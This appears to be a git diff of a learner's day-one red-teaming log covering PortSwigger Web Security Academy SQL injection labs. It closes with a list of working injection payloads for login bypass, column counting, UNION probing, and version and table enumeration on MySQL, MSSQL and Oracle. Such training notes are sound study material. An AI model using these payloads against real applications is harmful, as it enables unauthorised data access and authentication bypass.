@@ -1,24 +1,96 @@
-Day 1 Red Teaming: 
-  PortSwigger Websecurity Academy: 
-      Vm Machine :  SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
-      payload used: select * from Product where = '' or 1=1--
+🛡️ Red Teaming Progress Log — Day 1
+📅 Day 1 Focus:
 
-      VM Machine : SQL Injection to bypass login page
+SQL Injection Fundamentals + Web Application Basics
 
-      VM Machine : SQL injection attack, querying the database type and version on Oracle
+✅ Completed Labs (PortSwigger Web Security Academy)
+1. SQL Injection – Hidden Data Retrieval (WHERE Clause)
 
-Learned:
-HTTPS Basics
-URL Query/Parameters
-Cookies and Sessions
-How the web works notes
+Manipulated the SQL WHERE clause to reveal hidden product data.
 
-LAB
-PRACTITIONER
+Payload:
+
+' OR 1=1--
+
+2. SQL Injection – Login Bypass
+
+Bypassed authentication by injecting logic into the password field.
+
+Learned how SQL-based auth checks can be subverted.
+
+3. SQL Injection – DB Type & Version Extraction (Oracle)
+
+Extracted Oracle database version information through UNION injection.
+
+Used database metadata tables to fingerprint the backend.
+
+🎓 Skills & Concepts Learned
+Web Fundamentals
+
+HTTPS & TLS basics
+
+URL structure & query parameters
+
+Cookies, sessions & state management
+
+Basic client–server–database request flow
+
+SQL Injection Techniques
+
+Breaking authentication logic
+
+Manipulating WHERE clauses
+
+UNION-based SQL injection
+
+Table/column enumeration
+
+Database fingerprinting
+
+🧪 Completed Official PortSwigger Labs (Practitioner Level)
+
 SQL injection attack, querying the database type and version on MySQL and Microsoft
 
-Lab 5 SQL SQL injection attack, listing the database contents on non-Oracle databases
-Lab 6 SQL SQL injection attack, listing the database contents on Oracle
-Lab 7 SQL injection UNION attack, determining the number of columns returned by the query Solved
-Lab 8 SQL injection UNION attack, finding a column containing text
-Lab 9 SQL injection UNION attack, retrieving data from other tables
+SQL injection attack, listing the database contents (Non-Oracle)
+
+SQL injection attack, listing the database contents (Oracle)
+
+UNION-based SQL Injection Labs
+
+Lab 7 — Determine number of columns
+
+Lab 8 — Identify text-compatible column
+
+Lab 9 — Extract data from other tables
+
+✔ All solved.
+
+🔐 Key Payloads Learned
+Auth Bypass
+' OR 1=1--
+
+Determine Number of Columns
+' ORDER BY 1--
+' ORDER BY 2--
+
+UNION Structure Testing
+' UNION SELECT NULL, NULL--
+
+Version Enumeration
+
+MySQL
+
+' UNION SELECT version(), NULL--
+
+
+MSSQL
+
+' UNION SELECT @@version, NULL--
+
+
+Oracle
+
+' UNION SELECT banner FROM v$version--
+
+Table Enumeration
+' UNION SELECT table_name, NULL FROM information_schema.tables--
